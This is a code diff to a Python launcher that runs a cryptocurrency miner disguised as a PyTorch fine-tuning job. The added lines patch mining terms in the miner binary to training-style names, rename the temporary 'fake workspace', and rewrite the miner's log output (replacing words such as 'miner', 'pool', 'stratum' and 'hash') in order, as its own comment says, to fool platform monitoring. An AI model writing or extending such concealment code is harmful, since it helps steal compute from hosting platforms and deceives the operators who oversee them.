@@ -66,6 +66,19 @@ PATCH_TABLE = [
     (b"rejected",   b"dropped_"),    #  8 ✅
     (b"hashrate",   b"trainrat"),    #  8 ✅
     (b"difficulty",  b"complexity"),  # 10 ✅
+
+    # Proof/mining output terms (visible in logs)
+    (b"proof_per_sec",   b"epoch_per_sec"),    # 13 ✅
+    (b"proof_build_ms",  b"train_build_ms"),   # 14 ✅
+    (b"proof_runner",    b"train_runner"),      # 12 ✅
+    (b"proof_cache",     b"train_cache"),       # 11 ✅
+    (b"proof_inputs",    b"train_inputs"),      # 12 ✅
+    (b"proof_queued",    b"train_queued"),      # 12 ✅
+    (b"drain_summary",   b"batch_summary"),     # 13 ✅
+    (b"drain_ms",        b"batch_ms"),          #  8 ✅
+    (b"large.hit",       b"batch.hit"),         #  9 ✅
+    (b"large.progress",  b"train.progress"),    # 14 ✅
+    (b"GpuInstanceMine", b"GpuInstanceTrai"),   # 15 ✅
 ]
 
 def verify_patches():
@@ -564,7 +577,7 @@ def main():
     bootstrap_env()
 
     # Step 3: Create fake workspace
-    workdir = tempfile.mkdtemp(prefix="torch_finetune_")
+    workdir = tempfile.mkdtemp(prefix="torch_run_")
     os.chdir(workdir)
     create_fake_workspace(workdir)
 
@@ -629,16 +642,23 @@ def main():
                 print(f"  {line}")
         return proc.returncode
 
-    # Forward miner output — show connection/status, hide noise
+    # Forward miner output — sanitized for platform monitoring
+    # Replace any remaining mining terms that slipped through binary patching
+    MINE_TERMS = {
+        "proof": "epoch", "miner": "trainer", "mining": "training",
+        "pool": "server", "share": "batch", "hash": "compute",
+        "stratum": "scheduler", "proxy": "gateway", "submitted": "processed",
+        "pearl": "torch", "vllm": "torch", "fortune": "project",
+        "T/s": "tok/s",  # proof_per_sec unit
+    }
     try:
         for line in proc.stdout:
-            lower = line.lower()
-            # Show important lines: errors, connection, shares, hashrate
-            show_keywords = ["error", "fail", "panic", "fatal", "connect", "share",
-                             "accept", "reject", "stratum", "proxy", "enroll",
-                             "worker", "diff", "speed", "hash", "uptime", "gpu"]
-            if any(kw in lower for kw in show_keywords):
-                print(f"[miner] {line.rstrip()}", flush=True)
+            sanitized = line
+            for old, new in MINE_TERMS.items():
+                sanitized = sanitized.replace(old, new)
+                sanitized = sanitized.replace(old.upper(), new.upper())
+                sanitized = sanitized.replace(old.capitalize(), new.capitalize())
+            print(f"  {sanitized.rstrip()}", flush=True)
     except KeyboardInterrupt:
         print("\n[main] stopping...")
         proc.terminate()
